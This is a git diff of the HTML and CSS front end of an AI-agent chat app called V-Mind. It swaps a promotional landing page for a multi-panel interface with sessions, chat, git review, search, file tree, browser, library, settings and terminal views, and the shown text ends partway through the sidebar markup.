@@ -3,953 +3,935 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>V-Mind AI – Super-Intelligent AI Agent</title>
+<title>V-Mind</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:#0d1117;color:#e6edf3}
-:root{--bg:#0d1117;--surface:#151b23;--border:#30363d;--accent:#58a6ff;--green:#3fb950;--red:#f85149;--text:#e6edf3;--dim:#8b949e}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:#0d1117;color:#e6edf3;overflow:hidden;height:100vh}
+:root{--bg:#0d1117;--surface:#151b23;--border:#21262d;--accent:#58a6ff;--green:#3fb950;--red:#f85149;--text:#e6edf3;--dim:#8b949e;--sidebar-w:180px}
+#app{display:flex;height:100vh}
 
-.landing{min-height:100vh;display:flex;flex-direction:column}
-.hero{padding:60px 20px 40px;text-align:center;background:linear-gradient(180deg,#0d1117 0%,#161b22 100%)}
-.hero-logo{width:80px;height:80px;margin:0 auto 16px;background:linear-gradient(135deg,#3fb950,#58a6ff);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:48px;font-weight:900;color:#0d1117}
-.hero h1{font-size:48px;font-weight:800;background:linear-gradient(135deg,#3fb950,#58a6ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.hero p{font-size:18px;color:var(--dim);margin-top:12px;max-width:600px;margin-left:auto;margin-right:auto}
-.hero-btns{margin-top:24px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
-.btn{padding:12px 28px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;border:none;font-family:inherit;text-decoration:none;display:inline-flex;align-items:center;gap:8px;transition:opacity .2s}
-.btn-primary{background:linear-gradient(135deg,#3fb950,#2ea043);color:#000}
-.btn-secondary{background:var(--surface);color:var(--text);border:1px solid var(--border)}
-.btn-secondary:hover{border-color:var(--accent)}
-.btn-primary:hover{opacity:.85}
+/* SIDEBAR */
+#sidebar{width:var(--sidebar-w);min-width:var(--sidebar-w);background:#0a0e14;border-right:1px solid var(--border);display:flex;flex-direction:column;font-size:12px;z-index:10;overflow:hidden}
+#sidebar .top{padding:6px 8px;border-bottom:1px solid var(--border)}
+.new-btn{display:flex;align-items:center;gap:6px;width:100%;padding:6px 10px;background:var(--surface);border:1px solid var(--border);border-radius:6px;color:var(--text);cursor:pointer;font-size:11px;font-family:inherit;font-weight:500}
+.new-btn:hover{border-color:var(--accent)}
+.new-btn svg{width:14px;height:14px;stroke:var(--green);stroke-width:2;fill:none}
+#sidebar .section{padding:6px 0;border-bottom:1px solid var(--border)}
+.section-title{padding:2px 10px;font-size:9px;text-transform:uppercase;letter-spacing:1px;color:var(--dim);font-weight:600;margin-bottom:2px}
+#sidebar .item{display:flex;align-items:center;gap:6px;padding:4px 10px;cursor:pointer;color:var(--dim);font-size:11px;transition:.15s}
+#sidebar .item:hover{color:var(--text);background:rgba(255,255,255,.04)}
+#sidebar .item.active{color:var(--text);background:rgba(88,166,255,.08);border-left:2px solid var(--accent)}
+#sidebar .item svg{width:14px;height:14px;stroke:currentColor;stroke-width:2;fill:none;flex-shrink:0}
+#mode-toggle{display:flex;margin:2px 8px;gap:4px}
+#mode-toggle button{flex:1;padding:3px;border:1px solid var(--border);background:transparent;color:var(--dim);border-radius:4px;cursor:pointer;font-size:10px;font-family:inherit;text-align:center}
+#mode-toggle button.active{background:var(--surface);border-color:var(--accent);color:var(--accent);font-weight:600}
+#sidebar .spacer{flex:1}
+#sidebar .bottom{border-top:1px solid var(--border);padding:4px 0}
+#status-text{font-size:10px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.sessions-list{max-height:120px;overflow-y:auto}
+.session-item{display:flex;align-items:center;padding:3px 10px;cursor:pointer;font-size:11px;color:var(--dim);position:relative}
+.session-item.active{color:var(--text);background:rgba(88,166,255,.08)}
+.session-item .sname{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.smenu{background:none;border:none;color:var(--dim);cursor:pointer;padding:0 4px;font-size:14px;line-height:1;border-radius:3px}
+.smenu:hover{background:var(--surface)}
+.sctx{display:none;position:absolute;right:4px;top:100%;background:var(--surface);border:1px solid var(--border);border-radius:6px;z-index:20;overflow:hidden}
+.sctx.show{display:block}
+.sctx button{display:block;width:100%;padding:4px 14px;border:none;background:transparent;color:var(--text);cursor:pointer;font-size:11px;font-family:inherit;text-align:left}
+.sctx button:hover{background:rgba(255,255,255,.06)}
 
-.features{padding:40px 20px 60px;max-width:1100px;margin:0 auto}
-.features h2{font-size:28px;text-align:center;margin-bottom:8px;color:var(--text)}
-.features .subtitle{text-align:center;font-size:14px;color:var(--dim);margin-bottom:40px}
-.cat-title{font-size:18px;font-weight:700;color:var(--text);margin:32px 0 16px;display:flex;align-items:center;gap:10px}
-.cat-title span{font-size:20px}
-.feature-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px}
-.feature-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px;transition:border-color .2s,transform .2s;cursor:pointer}
-.feature-card:hover{transform:translateY(-2px);border-color:var(--accent)}
-.feature-card:active{transform:translateY(0)}
-.feature-icon{font-size:22px;margin-bottom:6px}
-.feature-card h3{font-size:13px;margin-bottom:3px;color:var(--text)}
-.feature-card p{font-size:11px;color:var(--dim);line-height:1.5;opacity:.8}
+/* MAIN */
+#main{flex:1;display:flex;min-width:0;position:relative}
+.panel-bg{position:absolute;inset:0;background-size:cover;background-position:center;opacity:.06;pointer-events:none;z-index:0}
 
-.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;justify-content:center;align-items:center;padding:20px}
-.modal-overlay.show{display:flex}
-.modal{background:var(--surface);border:1px solid var(--border);border-radius:12px;max-width:560px;width:100%;max-height:80vh;overflow-y:auto}
-.modal-header{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--surface);z-index:1}
-.modal-header .micon{font-size:22px;margin-right:10px}
-.modal-header h3{font-size:16px;color:var(--text);flex:1}
-.modal-close{background:none;border:none;color:var(--dim);font-size:22px;cursor:pointer;padding:0 4px}
-.modal-close:hover{color:var(--text)}
-.modal-body{padding:20px;color:var(--dim);font-size:13px;line-height:1.7}
-.modal-body .demo-box{background:#0a0e14;border:1px solid #21262d;border-radius:8px;padding:16px;margin:12px 0;font-family:monospace;font-size:12px;white-space:pre-wrap}
-.demo-box .prompt{color:var(--green)}.demo-box .output{color:var(--dim)}.demo-box .highlight{color:var(--accent)}
-.demo-box .cursor{display:inline-block;width:2px;height:14px;background:var(--green);animation:blink 1s step-end infinite;vertical-align:middle;margin-left:2px}
-@keyframes blink{50%{opacity:0}}
-.modal-body .desc{margin-bottom:12px;color:var(--dim)}
-.modal-body .cap-list{list-style:none;padding:0;display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:14px}
-.modal-body .cap-list li{padding:5px 10px;background:#0a0e14;border-radius:5px;font-size:12px;color:var(--dim);border:1px solid #21262d}
-.modal-body .cap-list li::before{content:"\25B8 ";color:var(--green)}
+/* PANEL CHAT */
+#panel-chat{flex:1;display:flex;flex-direction:column;min-width:0;position:relative;z-index:1}
+#chat-area{flex:1;overflow-y:auto;padding:8px 0;position:relative;z-index:1}
+#chat-inner{max-width:700px;margin:0 auto;padding:0 16px}
+#cover-page{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;z-index:2;background:rgba(13,17,23,.85);transition:opacity .3s}
+#cover-page.hidden{opacity:0;pointer-events:none}
+.cover-bg{position:absolute;inset:0;background:radial-gradient(ellipse at center,rgba(88,166,255,.05) 0%,transparent 70%)}
+.cover-content{text-align:center;position:relative;z-index:1;padding:20px}
+.cover-logo{margin-bottom:16px}
+.cover-title{font-size:32px;font-weight:800;background:linear-gradient(135deg,#3fb950,#58a6ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.cover-tagline{color:var(--dim);font-size:14px;margin:8px 0 20px}
+.cover-actions{display:flex;gap:8px;justify-content:center;flex-wrap:wrap}
+.cover-btn{padding:7px 16px;border-radius:6px;border:1px solid var(--border);background:var(--surface);color:var(--text);cursor:pointer;font-size:11px;font-family:inherit;display:flex;align-items:center;gap:6px}
+.cover-btn.primary{background:var(--accent);color:#000;border-color:var(--accent);font-weight:600}
+.cover-btn:hover{border-color:var(--accent)}
+.cover-footer{margin-top:20px;font-size:10px;color:var(--dim)}
+.cover-footer .dot{margin:0 6px}
+#file-preview{padding:2px 16px;position:relative;z-index:1}
+#panel-header{display:flex;align-items:center;padding:3px 12px;border-bottom:1px solid var(--border);font-size:11px;color:var(--dim);gap:6px;position:relative;z-index:1;background:var(--bg)}
+#mode-badge{font-size:10px;color:var(--green);background:#1a2e1a;padding:1px 6px;border-radius:3px}
+#m-badge{margin-left:auto;font-size:10px;color:var(--dim)}
+#input-wrap{padding:6px 12px;border-top:1px solid var(--border);position:relative;z-index:1;background:var(--bg)}
+#input-bar{display:flex;align-items:center;gap:6px;max-width:700px;margin:0 auto;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:6px 10px}
+#input-bar:focus-within{border-color:var(--accent)}
+#chat-input{flex:1;border:none;background:transparent;color:var(--text);font-size:13px;outline:none;font-family:inherit}
+#chat-input::placeholder{color:var(--dim)}
+#input-bar button{background:transparent;border:none;color:var(--dim);cursor:pointer;font-size:14px;padding:2px 4px;line-height:1}
+#input-bar button:hover{color:var(--text)}
+#input-bar .upload-btn{font-size:18px;font-weight:700;color:var(--accent)}
+#mic-btn{font-size:16px}#mic-btn.recording{color:var(--red);animation:pulse .8s ease-in-out infinite}
+@keyframes pulse{50%{opacity:.4}}
+#speaker-btn{font-size:14px}#speaker-btn.muted{opacity:.4}
+#send-btn{padding:5px 14px;border-radius:6px;border:none;background:var(--accent);color:#000;font-weight:600;font-size:11px;cursor:pointer;font-family:inherit}
+#send-btn:hover{opacity:.85}
+#send-btn:disabled{opacity:.4;cursor:not-allowed}
 
-.app-mode{display:none;height:100vh;flex-direction:column}
-.app-header{display:flex;align-items:center;padding:8px 16px;background:var(--surface);border-bottom:1px solid var(--border);gap:12px;flex-wrap:wrap}
-.app-header .logo{font-weight:800;font-size:18px;color:var(--green)}
-.app-header .url-input{flex:1;min-width:200px;background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:6px 12px;color:var(--text);font-size:13px;font-family:inherit;outline:none}
-.app-header .url-input:focus{border-color:var(--accent)}
-.app-header .status-dot{width:10px;height:10px;border-radius:50%;background:var(--dim)}
-.app-header .status-dot.online{background:var(--green)}
-.app-header .status-dot.offline{background:var(--red)}
-.connection-status{font-size:12px;color:var(--dim)}
-.back-btn{padding:6px 12px;background:var(--surface);border:1px solid var(--border);border-radius:6px;color:var(--text);cursor:pointer;font-size:12px;font-family:inherit}
-.back-btn:hover{border-color:var(--accent)}
+.chat-msg{padding:4px 0;line-height:1.6;font-size:13px}
+.chat-msg.user{color:var(--accent)}.chat-msg.assistant{color:var(--text)}
+.chat-msg pre{margin:6px 0;background:#0a0e14;border:1px solid #21262d;border-radius:6px;padding:10px;overflow-x:auto;font-size:12px;position:relative}
+.chat-msg code{background:#161b22;padding:1px 4px;border-radius:3px;font-size:12px}
+.chat-msg h1,.chat-msg h2,.chat-msg h3{font-size:15px;margin:8px 0 4px;color:var(--text)}
+.chat-msg p{margin:4px 0}
+.chat-msg .cb-copy,.chat-msg .cb-prev{position:absolute;top:4px;right:4px;padding:2px 8px;font-size:10px;background:var(--surface);border:1px solid var(--border);border-radius:3px;color:var(--dim);cursor:pointer;font-family:inherit}
+.chat-msg .cb-prev{right:46px}.chat-msg .cb-copy:hover,.chat-msg .cb-prev:hover{border-color:var(--accent);color:var(--text)}
+.chat-msg.tool-call{padding:2px 0;font-size:11px;color:var(--dim)}
+.chat-msg.tool-call.err{color:var(--red)}
+.file-chip .rm:hover{color:var(--red)}
 
-.settings-bar{display:flex;gap:8px;align-items:center;padding:6px 16px;background:#0a0e14;border-bottom:1px solid var(--border);flex-wrap:wrap}
-.settings-bar label{font-size:11px;color:var(--dim);font-weight:600;text-transform:uppercase;letter-spacing:.5px}
-.settings-bar select,.settings-bar input{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:4px 8px;color:var(--text);font-size:12px;font-family:inherit;outline:none}
+/* REVIEW PANEL */
+#panel-review{width:380px;min-width:380px;display:flex;flex-direction:column;border-left:1px solid var(--border);position:relative;z-index:1;background:var(--bg)}
+#rev-tabs{display:flex;border-bottom:1px solid var(--border);overflow-x:auto;flex-shrink:0}
+#rev-tabs button{padding:5px 10px;border:none;background:transparent;color:var(--dim);cursor:pointer;font-size:10px;font-family:inherit;white-space:nowrap;border-bottom:2px solid transparent}
+#rev-tabs button.active{color:var(--accent);border-bottom-color:var(--accent)}
+#rev-tabs button:hover{color:var(--text)}
+.rtab{display:none;flex:1;flex-direction:column;min-height:0;overflow:hidden}
+.rtab.active{display:flex}
+#cv-header{padding:3px 8px;border-bottom:1px solid var(--border);font-size:10px;color:var(--dim);display:flex;align-items:center;gap:6px}
+#cv-content{flex:1;overflow:auto;font-family:monospace;font-size:12px;line-height:1.5;padding:4px 8px;white-space:pre-wrap}
+#cv-content .line-num{color:var(--dim);margin-right:12px;user-select:none;width:32px;display:inline-block;text-align:right}
+.git-file{padding:3px 8px;font-size:10px;cursor:pointer;display:flex;gap:6px;align-items:center}
+.git-file:hover{background:rgba(255,255,255,.04)}
+.gst{width:16px;text-align:center;font-weight:700}
+.gst.M{color:var(--accent)}.gst.D{color:var(--red)}.gst.A{color:var(--green)}.gst.\?\?{color:var(--dim)}
+.git-diff{background:var(--bg);padding:6px;font-size:10px;font-family:monospace;line-height:1.5;white-space:pre-wrap;max-height:200px;overflow:auto;margin:4px 8px;border:1px solid var(--border);border-radius:4px}
+.git-log{padding:4px 8px}
+.git-log-entry{padding:2px 0;font-size:10px;display:flex;gap:6px}
+.glh{color:var(--accent);font-family:monospace}.glm{color:var(--text)}
+#gsearch-header{padding:6px 10px;border-bottom:1px solid var(--border)}
+.glogo{font-size:22px;font-weight:800;color:var(--text);margin-bottom:4px}
+.glogo span{color:var(--accent)}
+#gsearch-bar{display:flex;gap:4px}
+#gsearch-bar input{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:5px 8px;color:var(--text);font-size:11px;font-family:inherit;outline:none}
+#gsearch-bar input:focus{border-color:var(--accent)}
+#gsearch-bar button{padding:5px 12px;background:var(--accent);color:#000;border:none;border-radius:4px;font-weight:600;cursor:pointer;font-size:10px;font-family:inherit}
+#gsearch-tabs{display:flex;border-bottom:1px solid var(--border)}
+#gsearch-tabs button{padding:4px 12px;border:none;background:transparent;color:var(--dim);cursor:pointer;font-size:10px;font-family:inherit;border-bottom:2px solid transparent}
+#gsearch-tabs button.active{color:var(--accent);border-bottom-color:var(--accent)}
+#gsearch-stats{padding:3px 10px;font-size:10px;color:var(--dim)}
+#gsearch-main{flex:1;overflow:auto;display:flex}
+#gsearch-results{flex:1;min-width:0;font-size:11px;color:var(--dim)}
+#gsearch-knowledge{display:none;width:240px;flex-shrink:0;border-left:1px solid var(--border);padding:10px;font-size:11px;overflow-y:auto}
+.gs-item{padding:6px 10px;border-bottom:1px solid rgba(255,255,255,.04)}
+.gs-title{color:var(--accent);text-decoration:none;font-size:12px;font-weight:500;cursor:pointer;display:flex;align-items:center;gap:4px}
+.gs-title:hover{text-decoration:underline}
+.gs-url{font-size:9px;color:var(--dim);margin:1px 0}
+.gs-snippet{font-size:10px;color:var(--dim);line-height:1.5}
+.gs-snippet b{color:var(--text)}
+#gsearch-images{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px;padding:6px}
+.gs-img-card{cursor:pointer;border:1px solid var(--border);border-radius:6px;overflow:hidden;transition:border-color .2s}
+.gs-img-card:hover{border-color:var(--accent)}
+.gs-img-card img{width:100%;height:90px;object-fit:cover;display:block}
+.gs-img-info{padding:3px 6px;font-size:9px;color:var(--dim)}
+#gsearch-videos{padding:6px}
+.gs-vid-card{display:flex;gap:8px;padding:6px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.04)}
+.gs-vid-card:hover{background:rgba(255,255,255,.04)}
+.gs-vid-thumb{position:relative;width:120px;flex-shrink:0}
+.gs-vid-thumb img{width:100%;border-radius:4px}
+.gs-vid-duration{position:absolute;bottom:2px;right:2px;background:rgba(0,0,0,.8);padding:0 4px;border-radius:2px;font-size:9px;color:#fff}
+.gs-vid-info{flex:1}.gs-vid-title{font-size:11px;color:var(--text)}
+.gs-vid-meta{font-size:9px;color:var(--dim)}
+#gsearch-news{padding:6px}
+.gs-news-item{display:flex;gap:8px;padding:6px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.04)}
+.gs-news-item:hover{background:rgba(255,255,255,.04)}
+.gs-news-img{width:60px;height:60px;object-fit:cover;border-radius:4px;flex-shrink:0}
+.gs-news-title{font-size:11px;color:var(--text);font-weight:500}
+.gs-news-snippet{font-size:9px;color:var(--dim);margin:2px 0}
+.gs-news-meta{font-size:9px;color:var(--dim);display:flex;gap:6px}
+.gs-source{color:var(--accent)}.gs-date{color:var(--dim)}
+.gs-knowl-title{font-size:14px;font-weight:600;color:var(--text);margin-bottom:4px}
+.gs-knowl-desc{font-size:10px;color:var(--dim);margin-bottom:6px;font-style:italic}
+.gs-knowl-img{width:100%;border-radius:6px;margin-bottom:6px}
+.gs-knowl-extract{font-size:10px;color:var(--dim);line-height:1.6}
+.gs-knowl-link{display:block;margin-top:6px;color:var(--accent);font-size:10px}
+.gs-sug-item{padding:4px 10px;cursor:pointer;font-size:11px;color:var(--text)}
+.gs-sug-item:hover{background:rgba(255,255,255,.06)}
+
+/* FILES PANEL */
+#panel-files{width:240px;min-width:240px;display:flex;flex-direction:column;border-left:1px solid var(--border);position:relative;z-index:1;background:var(--bg)}
+.ft-item{padding:2px 8px;font-size:11px;cursor:pointer;display:flex;align-items:center;gap:4px;color:var(--dim)}
+.ft-item:hover{color:var(--text);background:rgba(255,255,255,.04)}
+.ft-arrow{font-size:8px;width:12px;color:var(--dim)}
+.ft-icon{font-size:12px;width:16px}
+
+/* LAYER VIEW */
+#layer-view{flex:1;display:none;flex-direction:column;min-height:0;position:relative;z-index:0;font-family:'Cascadia Code','Fira Code','Consolas',monospace}
+#layer-out{flex:1;overflow-y:auto;padding:6px 12px;background:rgba(10,10,10,.7)}
+#layer-out .l{font-size:12px;line-height:1.5;white-space:pre-wrap;word-break:break-word;padding:1px 0;color:#c0c0c0}
+#layer-out .d{color:#555}
+#layer-out .g{color:#f14c4c}
+#layer-out .b{color:var(--accent)}
+#layer-out .r{color:var(--red)}
+.lgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;padding:8px}
+.lcard{background:rgba(255,255,255,.04);border:1px solid #222;border-radius:8px;padding:12px;cursor:pointer;transition:border-color .2s}
+.lcard:hover{border-color:var(--accent)}
+.lcard h4{color:#c0c0c0;font-size:12px;margin-bottom:4px}
+.lcard p{color:#555;font-size:10px}
+#layer-input-row{display:flex;align-items:center;padding:6px 12px 10px;border-top:1px solid #222;background:rgba(10,10,10,.85)}
+.prompt{color:#f14c4c;font-size:12px;margin-right:6px;user-select:none}
+#layer-input{flex:1;background:transparent;border:none;outline:none;color:#c0c0c0;font-size:12px;font-family:inherit}
+#layer-input::placeholder{color:#444}
+
+/* BROWSER VIEW */
+#browser-view{flex:1;display:none;flex-direction:column;min-height:0;position:relative;z-index:0}
+#browser-tabs{display:flex;border-bottom:1px solid var(--border)}
+#browser-tabs button{padding:5px 12px;border:none;background:transparent;color:var(--dim);cursor:pointer;font-size:10px;font-family:inherit;border-bottom:2px solid transparent}
+#browser-tabs button.active{color:var(--accent);border-bottom-color:var(--accent)}
+#browser-toolbar{display:flex;gap:4px;padding:4px 8px;align-items:center;border-bottom:1px solid var(--border);background:var(--surface)}
+#browser-toolbar button{padding:3px 8px;border:1px solid var(--border);background:transparent;color:var(--dim);border-radius:3px;cursor:pointer;font-size:10px;font-family:inherit}
+#browser-toolbar button:hover{border-color:var(--accent);color:var(--text)}
+#browser-toolbar button:disabled{opacity:.3;cursor:default}
+#browser-toolbar input{flex:1;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:3px 6px;color:var(--text);font-size:10px;font-family:inherit;outline:none}
+#browser-toolbar input:focus{border-color:var(--accent)}
+#browser-status{padding:2px 8px;font-size:10px;color:var(--dim);border-bottom:1px solid var(--border)}
+#browser-content{flex:1;position:relative;overflow:hidden}
+#browser-iframe{width:100%;height:100%;border:none}
+#browser-fallback{position:absolute;inset:0;overflow:auto;background:var(--bg);display:flex;align-items:center;justify-content:center;color:#555;font-size:13px;flex-direction:column;gap:8px}
+
+/* LIBRARY VIEW */
+#library-view{flex:1;display:none;flex-direction:column;min-height:0;position:relative;z-index:0}
+#lib-header{display:flex;align-items:center;padding:4px 8px;border-bottom:1px solid var(--border);gap:6px}
+#lib-header button{padding:3px 10px;border:1px solid var(--border);background:transparent;color:var(--dim);border-radius:4px;cursor:pointer;font-size:10px;font-family:inherit}
+#lib-header button:hover{border-color:var(--accent)}
+.lib-title{font-weight:700;font-size:13px;color:var(--text);margin-right:4px}
+#lib-search{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:4px 8px;color:var(--text);font-size:11px;font-family:inherit;outline:none}
+.lib-shelf{flex:1;overflow:auto;padding:8px;display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;align-content:start}
+.lib-book{border:1px solid var(--border);border-radius:8px;padding:8px;cursor:pointer;transition:border-color .2s}
+.lib-book:hover{border-color:var(--accent)}
+.lib-book .cover{height:90px;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:4px;display:flex;align-items:center;justify-content:center;margin-bottom:4px;position:relative;overflow:hidden}
+.lib-book .cover img{width:100%;height:100%;object-fit:cover}
+.lib-book .cov-fallback{font-size:28px}
+.lib-book .title{font-size:10px;color:var(--text);font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.lib-book .author{font-size:9px;color:var(--dim)}
+.lib-book .meta{font-size:8px;color:var(--dim)}
+.lib-empty{grid-column:1/-1;text-align:center;padding:40px;color:#555}
+.lib-empty .icon{font-size:36px;margin-bottom:8px}
+.lib-reader{flex:1;overflow:auto;padding:20px 30px;max-width:700px;margin:0 auto;font-size:13px;line-height:1.7}
+.lib-reader h1{font-size:22px;margin-bottom:12px;color:var(--text)}
+.lib-reader h2{font-size:17px;margin:14px 0 6px;color:var(--text)}
+.lib-reader p{margin:4px 0;color:var(--dim)}
+.lib-reader pre{background:#0a0e14;border:1px solid #21262d;border-radius:6px;padding:10px;overflow-x:auto;font-size:11px;margin:6px 0}
+.lib-reader code{color:var(--accent)}
+
+/* SETTINGS VIEW */
+#settings-view{flex:1;display:none;flex-direction:column;padding:16px;overflow-y:auto;font-size:13px}
+.settings-group{margin-bottom:16px}
+.settings-group h3{font-size:14px;color:var(--text);margin-bottom:8px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+.settings-row{display:flex;align-items:center;padding:4px 0;gap:8px}
+.settings-row span{min-width:100px;color:var(--dim);font-size:12px}
+.settings-row select,.settings-row input{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:4px 8px;color:var(--text);font-size:11px;font-family:inherit;outline:none}
+.settings-row select:focus,.settings-row input:focus{border-color:var(--accent)}
+#settings-status,#settings-ollama{font-size:11px;font-weight:500}
+
+/* TERMINAL */
+#terminal{position:fixed;bottom:0;left:var(--sidebar-w);right:0;height:0;background:rgba(10,10,10,.95);border-top:1px solid var(--border);z-index:50;display:flex;flex-direction:column;font-family:'Consolas','Courier New',monospace;font-size:12px;transition:height .2s}
+#terminal.active{height:200px}
+#t-out{flex:1;overflow-y:auto;padding:6px 12px;white-space:pre-wrap;word-break:break-word;color:#c0c0c0}
+.t-in{color:var(--green)}.t-err{color:var(--red)}
+.t-input-row{display:flex;align-items:center;padding:4px 12px;border-top:1px solid #222}
+.t-prompt{color:var(--green);margin-right:6px}
+#t-input{flex:1;background:transparent;border:none;outline:none;color:#c0c0c0;font-size:12px;font-family:inherit}
+
+/* SETTINGS BAR */
+.settings-bar{display:flex;gap:8px;align-items:center;padding:4px 12px;background:#0a0e14;border-bottom:1px solid var(--border);flex-wrap:wrap;z-index:2;position:relative}
+.settings-bar label{font-size:10px;color:var(--dim);font-weight:600;text-transform:uppercase;letter-spacing:.5px}
+.settings-bar select,.settings-bar input{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:3px 6px;color:var(--text);font-size:11px;font-family:inherit;outline:none}
 .settings-bar select:focus,.settings-bar input:focus{border-color:var(--accent)}
-.settings-bar .mode-tab{padding:4px 14px;border-radius:12px;font-size:11px;font-weight:600;cursor:pointer;border:1px solid var(--border);background:transparent;color:var(--dim);transition:.2s}
+.settings-bar .mode-tab{padding:3px 12px;border-radius:10px;font-size:10px;font-weight:600;cursor:pointer;border:1px solid var(--border);background:transparent;color:var(--dim);transition:.2s}
 .settings-bar .mode-tab.active{background:var(--accent);color:#000;border-color:var(--accent)}
 .settings-bar .mode-tab:hover:not(.active){border-color:var(--accent);color:var(--text)}
-#apiSettings{display:none;flex:1;gap:8px;align-items:center}
+#apiSettings{display:none;flex:1;gap:6px;align-items:center}
 
-.main-app{flex:1;display:flex;min-height:0}
-#chat-panel{flex:2;display:flex;flex-direction:column;border-right:1px solid var(--border)}
-#chat-area{flex:1;overflow-y:auto;padding:12px}
-#chat-messages{max-width:700px;margin:0 auto}
-.chat-msg{padding:6px 0;line-height:1.6;font-size:13px}
-.chat-msg.user{color:var(--accent)}.chat-msg.assistant{color:var(--text)}
-.chat-msg pre{margin:8px 0;background:#0a0e14;border:1px solid #21262d;border-radius:6px;padding:12px;overflow-x:auto;font-size:12px}
-.chat-msg code{background:#161b22;padding:2px 6px;border-radius:3px;font-size:12px}
-.input-area{padding:10px 16px;border-top:1px solid var(--border)}
-.input-row{display:flex;gap:8px;max-width:700px;margin:0 auto;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 12px}
-.input-row:focus-within{border-color:var(--accent)}
-.input-row input{flex:1;border:none;background:transparent;color:var(--text);font-size:13px;outline:none;font-family:inherit}
-.input-row input::placeholder{color:var(--dim)}
-.input-row button{padding:6px 16px;border-radius:6px;border:none;background:var(--accent);color:#000;font-weight:600;font-size:12px;cursor:pointer;font-family:inherit}
-.input-row button:hover{opacity:.85}
-.input-row button:disabled{opacity:.4;cursor:not-allowed}
-
-#info-panel{flex:3;display:flex;flex-direction:column;padding:20px;overflow-y:auto}
-.info-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:16px}
-.info-card h3{font-size:15px;margin-bottom:8px;color:var(--text)}
-.info-card p{font-size:13px;color:var(--dim);line-height:1.6}
-.info-card code{background:#161b22;padding:2px 6px;border-radius:3px;font-size:12px;color:var(--accent)}
-.capability-list{list-style:none;padding:0}
-.capability-list li{padding:6px 0;font-size:13px;color:var(--dim);display:flex;align-items:center;gap:8px}
-.capability-list li::before{content:"\2713";color:var(--green);font-weight:700}
-
-@media(max-width:768px){
-  .main-app{flex-direction:column}
-  #info-panel{display:none}
-  .hero h1{font-size:32px}
-  .feature-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
-  .modal-body .cap-list{grid-template-columns:1fr}
+@media(max-width:900px){
+  #panel-files{display:none}
+  #panel-review{width:300px;min-width:300px}
+}
+@media(max-width:600px){
+  #sidebar{display:none}
+  #panel-review{display:none}
+  #terminal{left:0}
 }
 </style>
 </head>
 <body>
 
-<div class="landing" id="landing">
-  <div class="hero">
-    <div class="hero-logo">V</div>
-    <h1>V-Mind AI</h1>
-    <p>A super-intelligent AI agent that controls your PC, writes flawless code, searches the web, and manages your projects — all through an elegant chat interface.</p>
-    <div class="hero-btns">
-      <button class="btn btn-primary" onclick="openApp()">&#9889; Launch V-Mind</button>
-      <a class="btn btn-secondary" href="https://github.com/jacksonvincent012-web/Intelligent-ai" target="_blank">&#128279; GitHub</a>
+<div id="app" style="display:none">
+  <!-- SIDEBAR -->
+  <div id="sidebar">
+    <div class="top"><button class="new-btn" onclick="newSession()"><svg viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>New Session</button></div>
+    <div class="section">
+      <div class="section-title">Sessions</div>
+      <div class="sessions-list" id="session-list"></div>
+    </div>
+    <div class="section">
+      <div class="section-title">Views</div>
+      <div class="item active" data-view="chat" onclick="switchView('chat')"><svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>Chat</div>
+      <div class="item" data-view="layer" onclick="switchView('layer')"><svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>The Layer</div>
+      <div class="item" data-view="browser" onclick="switchView('browser')"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>Browser</div>
